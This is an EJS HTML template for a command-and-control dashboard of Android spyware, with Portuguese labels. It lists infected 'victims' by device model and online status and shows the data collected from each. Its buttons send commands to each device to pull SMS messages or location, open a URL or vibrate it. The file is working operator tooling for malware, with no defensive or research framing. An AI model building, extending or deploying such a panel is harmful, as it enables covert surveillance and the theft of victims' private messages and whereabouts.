<!-- language: HTML, file: views/dashboard.ejs -->
<!DOCTYPE html>
<html>
<head>
    <title>C2 Dashboard</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
        th { background: #222; }
        .btn { padding: 5px; background: #333; color: #fff; border: none; cursor: pointer; margin: 2px; }
        .btn:hover { background: #555; }
        .online { color: #0f0; }
        .offline { color: #f00; }
    </style>
</head>
<body>
    <h1>💀 Painel C2</h1>
    <p>Vítimas online: <%= Object.keys(victims).length %></p>

    <table>
        <tr>
            <th>ID</th><th>Modelo</th><th>Status</th><th>Ações</th>
        </tr>
        <% for (let id in victims) { 
            let v = victims[id]; 
            let isOnline = (Date.now() - v.last_seen) < 60000; // 1 min
        %>
        <tr>
            <td><%= id.substring(0,10) %></td>
            <td><%= v.model %> (<%= v.android %>)</td>
            <td class="<%= isOnline ? 'online' : 'offline' %>">
                <%= isOnline ? 'ONLINE' : 'OFFLINE' %>
            </td>
            <td>
                <!-- Formulário pra mandar comando -->
                <form action="/send-command" method="POST" style="display:inline;">
                    <input type="hidden" name="pw" value="<%= request.query.pw %>">
                    <input type="hidden" name="device_id" value="<%= id %>">
                    <button name="command" value="get_sms" class="btn">SMS</button>
                    <button name="command" value="get_location" class="btn">Loc</button>
                    <button name="command" value="open_url" class="btn">URL</button>
                    <button name="command" value="vibrate" class="btn">Vibrar</button>
                </form>
            </td>
        </tr>
        <tr>
            <td colspan="4" style="background:#1a1a1a; font-size:12px;">
                <strong>Dados:</strong> <pre><%= JSON.stringify(v.info, null, 2) %></pre>
            </td>
        </tr>
        <% } %>
    </table>
</body>
</html>
